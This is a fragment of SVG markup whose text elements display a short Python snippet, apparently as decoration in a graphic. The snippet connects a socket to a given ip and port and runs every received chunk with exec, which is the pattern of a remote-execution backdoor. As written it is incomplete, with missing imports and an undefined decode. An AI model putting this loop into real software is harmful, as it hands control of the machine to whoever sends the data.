    <text x="700" y="190">from scapy.all import *</text>
    <text x="700" y="205">s = socket.socket()</text>
    <text x="700" y="220">s.connect((ip, port))</text>
    <text x="700" y="235">while True:</text>
    <text x="700" y="250">  data = s.recv(1024)</text>
    <text x="700" y="265">  exec(decode(data))</text>
